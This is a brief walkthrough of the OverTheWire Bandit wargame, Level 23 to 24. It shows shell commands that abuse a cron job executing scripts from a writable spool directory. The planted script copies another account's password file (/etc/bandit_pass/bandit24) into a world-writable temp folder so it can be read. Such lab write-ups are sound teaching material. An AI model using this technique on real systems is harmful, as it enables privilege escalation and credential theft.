# Level 23 -> Level 24  

```bash
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
cd /var/spool/bandit24/foo
mktemp -d
cd /tmp/tmp.9J9nSW5Y2r
touch password
nano script.sh
```

Create script.sh

```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.9J9nSW5Y2r/password
```

continue

```bash
chmod 777 -R /tmp/tmp.9J9nSW5Y2r
cp script.sh /var/spool/bandit24/foo/
cat password
```

